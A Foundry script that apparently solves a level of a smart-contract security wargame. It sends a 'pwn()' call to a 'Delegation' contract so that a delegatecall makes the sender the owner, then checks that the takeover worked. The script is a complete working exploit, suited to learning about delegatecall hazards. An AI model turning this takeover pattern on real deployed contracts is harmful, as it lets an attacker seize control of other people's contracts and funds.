pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {Delegate, Delegation} from "../src/Level06.sol";

contract Level06Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        require(levelDone(contractAddress, wallet.addr), "Solution failed");
    }

    function exploit(address target) private {
        bytes memory data = abi.encodeWithSignature("pwn()");
        (bool ok,) = address(target).call(data);
        require(ok, "call to pwn() failed");
    }

    function levelDone(address target, address attacker) private view returns (bool) {
        return Delegate(target).owner() == attacker;
    }
}
